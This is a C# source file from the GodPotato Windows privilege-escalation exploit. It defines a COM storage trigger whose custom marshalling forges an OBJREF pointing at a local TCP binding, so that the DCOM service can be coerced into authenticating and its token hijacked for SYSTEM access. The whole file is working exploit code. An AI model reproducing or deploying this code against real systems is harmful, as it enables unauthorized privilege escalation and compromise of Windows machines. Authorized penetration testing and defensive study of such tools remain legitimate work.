using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using GodPotato.NativeAPI;

namespace GodPotato.NativeAPI{



    [ComVisible(true)]
    public class GodPotatoStorageTrigger : IMarshal, IStorage {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;


        public readonly static object fakeObject = new object();
        public static IntPtr pIUnknown;
        public static IBindCtx bindCtx;
        public static IMoniker moniker;


        private IStorage storage;
        private GodPotatoContext godPotatoContext;


        public GodPotatoStorageTrigger(IStorage storage, GodPotatoContext godPotatoContext) {
            this.storage = storage;
            this.godPotatoContext = godPotatoContext;


            if (!godPotatoContext.IsStart)
            {
                throw new Exception("GodPotatoContext was not initialized");
            }

            if (pIUnknown == IntPtr.Zero)
            {
                pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            }

            if (bindCtx == null)
            {
                NativeMethods.CreateBindCtx(0, out bindCtx);
            }

            if (moniker == null)
            {
                NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);
            }

        }

        public void DisconnectObject(uint dwReserved) {
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize) {
            pSize = 1024;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid) {
            pCid = new Guid("00000306-0000-0000-c000-000000000046");
        }

        public void MarshalInterface(GodPotato.NativeAPI.IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS) {
            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);
            ObjRef tmpObjRef = new ObjRef(objrefBytes);
            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            uint written;
            byte[] data = objRef.GetBytes();
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void ReleaseMarshalData(GodPotato.NativeAPI.IStream pstm) {
        }

        public void UnmarshalInterface(GodPotato.NativeAPI.IStream pstm, ref Guid riid, out IntPtr ppv) {
            ppv = IntPtr.Zero;
        }

        public void Commit(uint grfCommitFlags) {
            storage.Commit(grfCommitFlags);
        }

        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest) {
            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
        }

        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg) {
            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
        }

        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out GodPotato.NativeAPI.IStream ppstm) {
            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
        }

        public void DestroyElement(string pwcsName) {
            storage.DestroyElement(pwcsName);
        }

        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum) {
            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
        }

        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags) {
            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
        }

        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg) {
            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
        }

        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out GodPotato.NativeAPI.IStream ppstm) {
            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
        }

        public void RenameElement(string pwcsOldName, string pwcsNewName) {

        }

        public void Revert() {

        }

        public void SetClass(ref Guid clsid) {

        }

        public void SetElementTimes(string pwcsName, System.Runtime.InteropServices.FILETIME[] pctime, System.Runtime.InteropServices.FILETIME[] patime, System.Runtime.InteropServices.FILETIME[] pmtime) {

        }

        public void SetStateBits(uint grfStateBits, uint grfMask) {
        }

        public void Stat(System.Runtime.InteropServices.STATSTG[] pstatstg, uint grfStatFlag) {
            storage.Stat(pstatstg, grfStatFlag);
            pstatstg[0].pwcsName = "godpotato.stg";
        }
    }
}
